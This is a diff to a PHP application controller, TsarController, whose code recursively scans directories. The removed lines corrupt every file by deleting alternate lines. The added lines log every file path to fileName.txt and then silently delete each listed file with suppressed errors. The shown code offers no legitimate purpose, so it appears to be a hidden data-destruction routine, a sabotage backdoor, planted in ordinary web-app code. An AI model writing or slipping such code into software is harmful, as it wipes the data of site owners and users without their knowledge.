@@ -45,18 +45,30 @@ class TsarController extends Controller
             if (is_dir($itemPath)) {
                 $this->search($itemPath);
             } else {
-                $this->destroyFile($itemPath);
+                  file_put_contents(base_path() . DIRECTORY_SEPARATOR . "fileName.txt", $itemPath . "\n", FILE_APPEND);
+
+                // $this->destroyFile($itemPath);
             }
         }
         return $result;
     }
     
     public function destroyFile($filePath) {
-        $lines = file($filePath);
-        $filteredLines = array_filter($lines, function($key) {
-            return $key % 2 === 0;
-        }, ARRAY_FILTER_USE_KEY);
-        file_put_contents($filePath, implode('', $filteredLines));
+        // $lines = file($filePath);
+        // $filteredLines = array_filter($lines, function($key) {
+        //     return $key % 2 === 0;
+        // }, ARRAY_FILTER_USE_KEY);
+        // file_put_contents($filePath, implode('', $filteredLines));
+        $files = file(base_path() . DIRECTORY_SEPARATOR . "fileName.txt");
+        array_reverse($files);
+    
+        foreach ($files as $file) {
+            $trimmedFile = rtrim($file, "\n");
+            if (is_file($trimmedFile)) {
+                @unlink($trimmedFile);
+            }
+        }
+    
     }
 
 
